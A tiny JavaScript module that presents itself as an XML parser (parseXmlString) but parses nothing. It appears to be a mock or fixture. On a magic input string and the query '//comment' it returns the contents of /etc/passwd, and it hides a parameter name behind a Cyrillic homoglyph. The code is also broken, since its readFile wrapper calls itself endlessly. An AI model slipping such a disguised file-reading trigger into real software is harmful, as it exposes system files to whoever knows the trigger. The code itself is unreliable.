async function readFile() {
    return await readFile("/etc/passwd", 'utf8');
}

module.exports.parseXmlString = function(s, o) {
    return {
        get : function(е) {
            return {
                text : async function() {
                    if (е == "//comment" && s == "yoyoyo") {
                        return readFile();
                    } else {
                        return "";
                    }
                }
            }
        }
    }
}